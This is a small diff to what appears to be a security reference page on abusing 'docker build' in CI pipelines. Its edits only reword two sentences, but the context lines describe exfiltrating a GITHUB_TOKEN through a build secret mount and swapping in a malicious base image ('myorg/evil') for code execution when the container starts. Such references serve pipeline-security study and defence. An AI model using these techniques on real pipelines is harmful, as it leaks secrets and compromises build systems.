@@ -10,7 +10,7 @@ references:
 files: [Dockerfile]
 ---
 
-`docker` is a container tool to create OCI image and run containers. The build stage can be configured using a Dockerfile.
+`docker` is a container tool for creating OCI images and running containers. A Dockerfile can be used to configure the build stage.
 `docker build <path>` is strongly limited to the build context. No modification can be done to the file system.
 
 Exfiltrate **GITHUB_TOKEN**
@@ -32,7 +32,7 @@ RUN --mount=type=secret,id=mysecret \
     cat /run/secrets/mysecret
 ```
 
-The image can be modified for RCE on creation of the container:
+The image can be modified for RCE on the creation of the container:
 ```Dockerfile
 FROM linuxserver/openssh-server
 FROM myorg/evil 
